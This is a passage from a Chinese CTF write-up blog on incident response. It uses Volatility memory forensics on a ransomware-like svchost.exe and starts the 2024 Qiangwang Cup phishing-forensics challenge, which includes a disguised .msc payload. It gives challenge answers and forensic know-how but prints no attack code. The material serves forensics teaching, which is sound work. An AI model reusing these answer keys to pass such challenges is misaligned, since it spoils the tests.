style="color:#393A34"><span class="token plain">    5784 svchost.exe          22 SeSystemEnvironmentPrivilege         Present,Enabled          Edit firmware environment values</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          23 SeChangeNotifyPrivilege              Present,Enabled,Default  Receive notifications of changes to files or directories</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          24 SeRemoteShutdownPrivilege            Present,Enabled          Force shutdown from a remote system</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          25 SeUndockPrivilege                    Present,Enabled          Remove computer from docking station</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          26 SeSyncAgentPrivilege                                          Synch directory service data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          27 SeEnableDelegationPrivilege                                   Enable user accounts to be trusted for delegation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          28 SeManageVolumePrivilege              Present,Enabled          Manage the files on a volume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          29 SeImpersonatePrivilege               Present,Enabled,Default  Impersonate a client after authentication</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          30 SeCreateGlobalPrivilege              Present,Enabled,Default  Create global objects</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          31 SeTrustedCredManAccessPrivilege                               Access Credential Manager as a trusted caller</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          32 SeRelabelPrivilege                                            Modify the mandatory integrity level of an object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          33 SeIncreaseWorkingSetPrivilege        Present,Enabled          Allocate more memory for user applications</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          34 SeTimeZonePrivilege                  Present,Enabled          Adjust the time zone of the computer's internal clock</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          35 SeCreateSymbolicLinkPrivilege        Present,Enabled          Required to create a symbolic link</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>对 <code>Attributes</code> 为 <code>Enabled</code> 的权限进行筛选统计，即可确定答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">23</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="威胁分析---06">威胁分析 - 06<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis%20IncidentResponse-threat%20analysis#%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90---06" class="hash-link" aria-label="威胁分析 - 06的直接链接" title="威胁分析 - 06的直接链接">​</a></h2>
<blockquote>
<p>在分析勒索软件的行为时，确定其在内存中加载的位置对于深入理解其运行机制和发现潜在的漏洞非常重要。通过内存取证，可以找到打开勒索软件文件的设备的虚拟地址。</p>
<p>请问，打开勒索软件文件的设备的虚拟地址是什么（16 进制）？（请将答案编辑并存入 <code>/opt/wxfx/answer/6.txt</code> 文件中，参考 <code>/opt/wxfx/example</code> 目录）</p>
</blockquote>
<p>在上文中，已经确认了恶意程序的可执行文件在内存中的偏移地址 <code>0xffff9a88056a9ef0</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS D:\Downloads\attachment\attachment&gt; .\volatility_2.6_win64_standalone.exe -f .\dump.mem --profile=Win10x64_14393 dumpfiles --regex "skills\\svchost\.exe" -D .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility Foundation Volatility Framework 2.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ImageSectionObject 0xffff9a88056a9ef0   5784   \Device\HarddiskVolume3\Users\skills\svchost.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DataSectionObject 0xffff9a88056a9ef0   5784   \Device\HarddiskVolume3\Users\skills\svchost.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>进入 <code>volshell</code> 进行分析</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS D:\Downloads\attachment\attachment&gt; .\volatility_2.6_win64_standalone.exe -f .\dump.mem --profile=Win10x64_14393 volshell -p 5784</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility Foundation Volatility Framework 2.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Current context: svchost.exe @ 0xffff9a8805cfb4c0, pid=5784, ppid=7136 DTB=0x30400000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Welcome to volshell! Current memory image is:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">file:///D:/Downloads/attachment/attachment/dump.mem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">To get help, type 'hh()'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;&gt;&gt; dt('_FILE_OBJECT',0xffff9a88056a9ef0)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[_FILE_OBJECT _FILE_OBJECT] @ 0xFFFF9A88056A9EF0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0   : Type                           5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2   : Size                           216</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x8   : DeviceObject                   18446632507711949952</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x10  : Vpb                            18446632507711953536</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x18  : FsContext                      18446651757703889232</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x20  : FsContext2                     18446651757801468480</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x28  : SectionObjectPointer           18446632507741760728</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x30  : PrivateCacheMap                0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x38  : FinalStatus                    0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x40  : RelatedFileObject              0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x48  : LockOperation                  0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x49  : DeletePending                  0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x4a  : ReadAccess                     1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x4b  : WriteAccess                    0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x4c  : DeleteAccess                   0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x4d  : SharedRead                     1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x4e  : SharedWrite                    0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x4f  : SharedDelete                   1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x50  : Flags                          278594</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x58  : FileName                       \Users\skills\svchost.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x68  : CurrentByteOffset              18446632507729944408</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x70  : Waiters                        0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x74  : Busy                           0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x78  : LastLock                       0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x80  : Lock                           18446632507729944432</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x98  : Event                          18446632507729944456</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xb0  : CompletionContext              0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xb8  : IrpListLock                    0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xc0  : IrpList                        18446632507729944496</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xd0  : FileObjectExtension            0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;&gt;&gt; hex(18446632507711949952)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'0xffff9a8804580c80L'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可确定答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0xffff9a8804580c80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>陈橘mo</name>
            <uri>https://randark.site</uri>
        </author>
        <category label="CTF" term="CTF"/>
        <category label="Incident-Response" term="Incident-Response"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[2024 强网杯 Master of DFIR]]></title>
        <id>https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8 Master of DFIR</id>
        <link href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8 Master of DFIR"/>
        <updated>2024-11-12T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[2024 强网杯 Master of DFIR 系列 题目分析]]></summary>
        <content type="html"><![CDATA[<p>2024 强网杯 Master of DFIR 系列 题目分析</p>
<ul>
<li>Master of DFIR - Phishing</li>
<li>Master of DFIR - Coffee</li>
</ul>
<p>本题存在有动态附件机制，本题目分析基于 <a href="https://github.com/CTF-Archives/2024-qwbs8" target="_blank" rel="noopener noreferrer">CTF-Archives/2024-qwbs8: 第八届 “强网杯” 全国网络安全挑战赛</a> 所存档的附件 <a href="https://github.com/CTF-Archives/2024-qwbs8/releases/download/v0.1/master_of_dfir.zip" target="_blank" rel="noopener noreferrer">master_of_dfir.zip - Release 附件下载 · CTF-Archives/2024-qwbs8</a> 进行编写</p>
<p>感谢 <a href="https://crazymanarmy.github.io/" target="_blank" rel="noopener noreferrer">空白爷 - crazyman_army</a> 为本次强网杯贡献的 Master of DFIR 系列题目</p>
<p>本分析所使用的题目信息基于 <a href="https://r3kapig-not1on.notion.site/QWB-S8-2024-Quals-Jeopardy-133ec1515fb980a38f76ea397defd07d" target="_blank" rel="noopener noreferrer">QWB S8 2024 Quals(Jeopardy) - r3kapig's notion</a></p>
<div style="text-align:center"><p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241158-165825-f0f8397254b584f5f212f406b3d96879.png" width="419" height="381" class="img_ev3q"></p><p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241126-152604-cd407ba20ed93a387097f6e873bffe88.png" width="1159" height="697" class="img_ev3q"></p><p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241126-152650-ae6c481b2f85f2b4707a6a41907ce984.png" width="927" height="785" class="img_ev3q"></p></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="master-of-dfir---phishing">Master of DFIR - Phishing<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#master-of-dfir---phishing" class="hash-link" aria-label="Master of DFIR - Phishing的直接链接" title="Master of DFIR - Phishing的直接链接">​</a></h2>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>题目描述</div><div class="admonitionContent_BuS1"><p>饥渴 C 猫是一个刚刚入职的员工，但是最近他发现自己的电脑变得越来越奇怪。可能由于是之前他接受的一封奇怪的邮件，于是饥渴 C 猫找到了你, 他希望你作为取证 - 应急响应大师可以帮忙。你可以完成调查到底发生了什么并且填写相关的调查报告。</p></div></div>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>Hints</div><div class="admonitionContent_BuS1"><p>第六问指得是解密完载荷后可以看到一个 s*****<em>s 的函数 (</em> 不代表正确长度) 然后你需要去提交该函数的参数, 这个参数是需要解字符串混淆后的一段字符串 并且将这段字符放到 cyberchef MD5 一下</p><p>第 12 问的最终载荷指得是 RAT 的载荷 java 的马和本题目毫无关系</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task1">task1<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task1" class="hash-link" aria-label="task1的直接链接" title="task1的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>攻击者的邮箱是什么? (注意: MD5(攻击者邮箱), 以 cyberchef 的为准) 示例: 9b04d152845ec0a378394003c96da594</p>
</li>
<li>
<p>受害者的邮箱是什么? (注意: MD5(受害者邮箱), 以 cyberchef 的为准) 示例: 9b04d152845ec0a378394003c96da594</p>
</li>
</ol>
</blockquote>
<p>在附件中有两个文件：</p>
<ul>
<li>关于组织参加第八届 “强网杯” 全国网络安全挑战赛的通知. eml</li>
<li>challenge.pcapng</li>
</ul>
<p>由于是提取邮箱信息，那么关注点放在 eml 文件上</p>
<p>在 eml 文件的 <code>From</code> 字段和 <code>To</code> 字段可以得到收件邮箱地址和发信邮箱地址</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">From: "alice@flycode.cn" &lt;alice@flycode.cn&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">To: bob &lt;bob@flycode.cn&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>计算哈希</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">攻击者的邮箱:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">alice@flycode.cn    -&gt;  a8cd5b4ba47e185d4a69a583fde84da5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">受害者的邮箱:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bob@flycode.cn      -&gt;  b9cae449f959162f0297fa43b458bd66</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. a8cd5b4ba47e185d4a69a583fde84da5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. b9cae449f959162f0297fa43b458bd66</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task2">task2<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task2" class="hash-link" aria-label="task2的直接链接" title="task2的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>攻击者所投放的文件 md5 是什么? (注意: 以 md5sum 的结果为准) 示例: 33ec9f546665aec46947dca16646d48e</p>
</li>
<li>
<p>攻击者所投放文件的密码是什么? 示例: 000nb</p>
</li>
</ol>
</blockquote>
<p>在 eml 文件中，可以发现有附件的存在</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241141-154118-f0aad41dd8dd238f924c994dfbe195e5.png" width="1501" height="1198" class="img_ev3q"></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS D:\Downloads\master_of_dfir&gt; get-fileHash -Algorithm MD5 ".\ 关于组织参加第八届 `“强网杯 `” 全国网络安全挑战赛的通知（11 月 2 日至 3 日举行线上赛）.zip"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Algorithm       Hash                                                                   Path</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---------       ----                                                                   ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MD5             F436B02020FA59F3F71E0B6DCAC6C7D3                                       D:\Downloads\master_of_dfir \ 关…</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>同时，在邮件正文中</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">本届 "强网杯" 拟于 11 月 02 日至 03 日举行线上赛，11 月下旬举行线下赛。 请各学校、 网信企业及机构关注 “强网竞赛” 微信公众号，报名参加竞赛活动，锻炼队伍、 深化交流， 进一步提升网络安全保障能力和水平。详细邀请文件见附件压缩包, 密码: 2024qwbs8</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以得到附件中压缩包的密码</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. f436b02020fa59f3f71e0b6dcac6c7d3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. 2024qwbs8</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task3">task3<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task3" class="hash-link" aria-label="task3的直接链接" title="task3的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>攻击者所使用的攻击载荷后缀是什么？ 示例: lnk</p>
</li>
<li>
<p>攻击者所使用的攻击载荷文件 windows 默认的打开方式的全称是什么? 示例: Microsoft Windows Based Scripting Host</p>
</li>
</ol>
</blockquote>
<p>使用已知密码将压缩包进行解压，得到：关于组织参加第八届 “强网杯” 全国网络安全挑战赛的通知（11 月 2 日至 3 日举行线上赛）.msc</p>
<p><code>msc</code> 文件的文件缩略图经过篡改，改为了 <code>pdf</code> 文件的缩略图，可以断定为经过伪造的恶意文件</p>
<p><code>msc</code> 文件的默认打开方式，是 Microsoft 管理控制台（Microsoft Management Console (MMC)）</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. msc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. Microsoft Management Console</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg 